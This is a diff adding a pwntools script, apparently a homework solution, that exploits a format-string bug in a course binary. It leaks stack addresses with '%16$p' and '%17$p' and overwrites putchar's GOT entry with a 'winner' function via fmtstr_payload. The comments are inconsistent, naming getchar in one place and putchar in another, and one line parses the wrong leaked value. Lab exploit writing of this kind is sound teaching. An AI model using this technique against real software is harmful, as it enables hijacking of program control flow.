@@ -1,0 +1,76 @@
+#!/usr/bin/env python3
+
+import time, os, traceback, sys, os
+import pwn
+import binascii, array
+from textwrap import wrap
+
+
+def start(argv=[], *a, **kw):
+    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
+        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
+    elif pwn.args.REMOTE: # ['server', 'port']
+        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: # run locally, no GDB
+        return pwn.process([binPath]+argv, *a, **kw, aslr=True)
+
+binPath="./hw2p2"
+isRemote = pwn.args.REMOTE
+
+# build in GDB support
+
+gdbscript = '''
+init-pwndbg
+break *mainProcessing+86
+continue
+'''.format(**locals())
+
+# interact with the program to get to where we can exploit
+
+pwn.context.log_level="debug"
+elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
+'''
+
+Process Steps & Goal Statement :
+
+1. Get the addresses of the winner function + getchar function.
+2. Store them in variables such that thhey are represented as Integers.
+3. Get the offset that the functions are located in GOT.
+4. Define the payload with the format string library of pwntools.
+
+Pwntools Functions : 
+- io.recvline() - Receives output in one single line
+- io.recv() - Receives the following output (can be many lines)
+- io.sendline() - Sends something in one line 
+- line() involves a \n in the end
+- pwn.fmtstr_payload(offset,{address overwritten(int) : address overwriting (int), write_size='short'})
+- You can save output from one line like this - x = io.recvline()
+
+- offset is the difference between the format string specifier & the defined variables stored on the stack, which in this case is 1. 
+
+'''
+io=start()
+
+io.recvuntil(b'Get user input:\n') # Wait until the program prints out the line "Get user input..."
+io.sendline(b'%16$p') # Then we send in the line to print out the 16th offset from top of the stack.
+winner_add = io.recvline() #Capture the output in a variable and convert it to integer.
+winner_int = int(winner_add, 16)
+
+io.recvuntil(b'Get user input:\n') # Wait until the program prints out the line "Get user input..."
+io.sendline(b'%17$p') # Then we send in the line to print out the 17th offset from top of the stack.
+got_add = io.recvline() #Capture the output in a variable and convert it to integer.
+got_int = int(winner_add, 16)
+
+putchar_int = int(got_add, 16) + 0x1c
+'''We shall over write the function 'putchar' in the global offset table.
+Which lies at an offset of 0x1c from the start of GOT.'''
+
+
+io.recvuntil(b'Get user input:\n')
+payload = pwn.fmtstr_payload(1, {putchar_int : winner_int}, write_size='short')
+
+'''This function combines all the addresses that we have extracted from the binary through
+the string format vulnerability, and turns it into a string.'''
+
+io.sendline(payload)
+io.interactive()
